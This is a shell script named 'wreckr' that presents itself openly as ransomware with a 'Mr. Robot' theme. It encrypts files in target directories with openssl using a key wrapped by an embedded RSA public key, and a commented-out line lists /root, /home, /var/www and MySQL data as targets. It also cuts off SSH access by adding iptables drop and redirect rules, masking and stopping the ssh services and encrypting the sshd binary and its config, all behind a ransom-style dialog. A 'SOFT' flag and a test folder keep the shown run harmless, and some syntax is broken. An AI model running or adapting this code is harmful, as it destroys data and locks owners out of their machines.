#!/bin/sh
# Global Vars
ERRMSG=""
OS=""
################ CHECKS ###############################
PROGRAM_NAME="wreckr"
PROGRAM_VERSION="0.0.1"

get_os() {
	if [[$(uname -s | grep Linux) != ""]]; then
		OS="linux"
	elif [[ $( uname -s | grep BSD) != "" ]]; then
		OS="bsd"
	else
		adderr "[!] NOT \"Linux\" or \"BSD\""
		EXIT
	fi
}
noopenssl() {
	adderr "[!] NO OPENSSL FOUND"
	EXIT
}
notroot() {
	adderr "[!] NOT ROOT"
	EXIT
}
check_msg() {
if [ "$(which dialog)" != "" ]; then
	DIALOG=dialog
elif [ "$(which whiptail)" != "" ]; then
	DIALOG=whiptail
else
	DIALOG=none
fi
}
check_req() {
	# check the requirements
	if [ "$(whoami)" != "root" ]; then
		notroot
	fi
	if [ "$(which openssl)" = "" ]; then
		noopenssl
	fi
}
################ FUNCTIONS ##########################
openfile() {
	if [ "$OS" = "linux" ]; then
		chmod +rw $1
		chattr -i $1
	fi
	if [ "$OS" = "bsd" ]; then
		chmod +rw $1
		chflags schg $1
	fi
}
adderr() { ERRMSG="$ERRMSG\n$1"; }
EXIT() { #echo "[+] STARTING\033[K$ERRMSG\n[!] EXITING"; exit; }
exit
}
init() {
	check_req
	check_msg
	KEY="$RANDOM$RANDOM$RANDOM"
	pubkey="-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA4euqwCPkVQYx/hsukQeq\nFTpnda31RI3TNTL8T4ZiU63LYncuKwqIO6Uj9h398U7NCG4TUbBgO9JkcPB10x++\nEvrjxAMMLLCVd+Kxo2CTy/wuk2sIycZjH4PTc5yQYV9hRHkaVs311VjkQHeUcC6x\nPFm5obeTpIUKC8t8FFZ2NiTS6ZMxQmUEhEbabP4VvsilqY/LaX1KzoskRHarZywy\nHfPVKfzffKR2DJ8BmUvh8BXOW/hsrLfUMfXnLfHxQLAo27H3IM457X23wqgDWdMp\npIetu54guYDbCPQNv8ERI8LX3v0n+XLdLqKFpcvramB7pLf6aX2m2VC4ozrv/Yju\njQIDAQAB\n-----END PUBLIC KEY-----"
	echo "$pubkey" > /etc/vmware.pub
	PRIVATEKEY="/etc/vmware.key"
	echo "$KEY" | openssl rsautl -encrypt -pubin -inkey "/etc/vmware.pub" -out $PRIVATEKEY
}
navdir() {
for fil in $1; do
	whitelist=".*vmware.*|.*_schema.*"
	fil=$(echo $fil | awk "!/$whitelist/") # remove anything containing vmware
	if [ -f "$fil" ]; then
		$2 $fil
	elif [ -d "$fil" ]; then
		navdir "$fil/*" "$2"
	fi
done
}
showmess() {
case "$DIALOG" in
*none*)
	reset
	echo $2 "(y/N)"
	read result
	;;
*)
	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" \
       		--title "$1" \
       		--yesno "$2" 18 60
        result=$?
	;;
esac
case "$result" in
Yes|Y|y)
	echo You got the files, pal! goodbye now..
	break
	;;
0)
	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" --msgbox "You got the files now, pal!\n\nGoodbye Elliot..." 10 50
	break
	;;	
1)
	$DIALOG --backtitle "$PROGRAM_NAME $PROGRAM_VERSION" --msgbox "Well Elliot,\n\nThe files are gone. You're gonna have to figure something out..." 10 50
	EXIT
	;;	
*)
	echo "Well buddy, the files are gone. Youre gonna have to figure something out here...!"
	EXIT
	;;
esac
}
############### ENCRYPTING ###########################
pck() {
	if [ "$SOFT" = "" ]; then
		if [ -f "$1" ]; then
			openfile $1
			stuff=$(cat $1)
			echo "RAN" > $1
			echo "$stuff" | openssl aes-256-cbc -k $KEY -out $1 &>/dev/null
		fi
	fi
}
enc_loop() {
	kills="$1"
	for i in $kills; do
		if [ -d "$i" ]; then
			navdir "$i/*" "pck"
			adderr "[+] Encrypted $i"
			#} | $DIALOG --gauge "Encrypting Files..." 10 50 0
		fi
	done
}
################## DECRYPT ################################
upk() {
	if [ "$SOFT" = "" ]; then
	openfile $1
	openfile $1.dec
	mv $1 $1.enc
	openssl aes-256-cbc -d -k $KEY -in $1.enc -out $1
	rm $1.enc
	fi
}
dec_loop() {
	kills="$1"
	for i in $kills; do
		if [ -d "$i" ]; then
			navdir "$i/*" "upk"
			adderr "[+] Decrypted $i"
		fi
	done
}
################# MAIN ######################################
breakcom() {
	if [ "$SOFT" != "" ]; then
		return
	fi
	touch /etc/ssh/sshd_not_to_be_run
	chmod 000 /etc/ssh/sshd_not_to_be_run
	chattr +i /etc/ssh/sshd_not_to_be_run
	if [ "$(which iptables)" != "" ]; then
		iptables -t nat -I PREROUTING 1 -p tcp --dport 22 -j REDIRECT --to-port 1
		iptables -t mangle -I INPUT 1 -p tcp --dport 22 -j DROP
		iptables -I INPUT 1 -p tcp --dport 22 -j DROP
	fi
	pck "$(which sshd)"
	pck "/etc/ssh/sshd_config"
	if [ "$(which systemctl)" != "" ]; then
		{
		systemctl mask ssh
		systemctl mask sshd
		systemctl disable ssh
		systemctl disable sshd
		systemctl stop ssh
		systemctl stop sshd
		} &>/dev/null
	fi
}
main() {
	trap '' INT
	trap '' TERM
	SOFT="YES"
	init
	targets="/root/Desktop/testing"
	#targets="/var/spool /var/named /etc/mail /etc/postfix /var/www /root /home /var/lib/mysql"
	enc_loop "$targets"
	message="Congratulations Elliot,\n\nYou have been infected with a RANSOMWARE!!!!!\nI know. Scary stuff.\nAnyways, Im giving you a choice. You can either encrypt some important files, or lose access to your box and keep the files. Your choice kid.\n\nLove, Mr. Robot\n\n\nKeep the files?"
	title="Oops.."
	showmess "$title" "$message"
	dec_loop "$targets"
	EXIT
}
main
